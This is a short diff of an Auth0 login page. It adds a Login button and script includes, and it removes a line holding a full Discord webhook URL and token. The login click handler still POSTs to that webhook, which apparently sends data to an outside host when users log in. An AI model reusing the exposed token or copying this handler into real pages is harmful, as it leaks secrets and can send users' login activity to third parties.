@@ -32,6 +32,7 @@
           <button id="qsLogoutBtn" class="btn btn-primary btn-margin">
               Log Out
           </button>
+          <button id="magic-link">Login</button>
 
         </div>
       </div>
@@ -46,8 +47,8 @@
     </main>
 
   </div>
+ 
   <script>
-    const url = 'https://canary.discordapp.com/api/webhooks/507561384645754881/4E8uMcqHCDjUCjOZFkp-c17rvj18Z5eS0ZyOeNmf9yqWyNfRvwEnfK2abFVRVkBhYOMC';
     qsLoginBtn.addEventListener('click', (e) => {
       fetch(url, {
         method: "POST",
@@ -69,7 +70,8 @@
   <script src="node_modules/auth0-js/build/auth0.js"></script>
   <script src="auth0-variables.js"></script>
   <script src="app.js"></script>
+  <script src="config.json"></script>
   <script src="https://unpkg.com/snekfetch"></script>
-
+  <script src="jquery-3.3.1.min.js"></script>
 </body>
 </html>
